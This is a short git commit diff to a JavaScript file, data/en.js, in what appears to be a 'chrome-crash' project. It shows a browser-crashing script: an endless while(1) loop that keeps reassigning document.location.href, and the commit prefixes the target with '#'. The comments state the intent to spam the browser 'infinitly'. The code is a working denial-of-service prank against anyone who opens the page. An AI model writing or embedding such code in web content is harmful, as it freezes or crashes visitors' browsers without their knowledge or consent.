2f57f7b63992efbae1448d0b3d3917b5d6052f71
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 14:41:30 -0600

    Update en.js

--- data/en.js
+++ data/en.js
@@ -1,10 +1,11 @@
 // Forces Browser To Ignore Popups
 $location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
+$vwer = '#';
 
 function loadUrl(location)
 {
   while(1) {
-    this.document.location.href = $location;
+    this.document.location.href =  $vwer + $location;
     // If Document Is Pressed. Spam Occures Infinitly
   }
 }
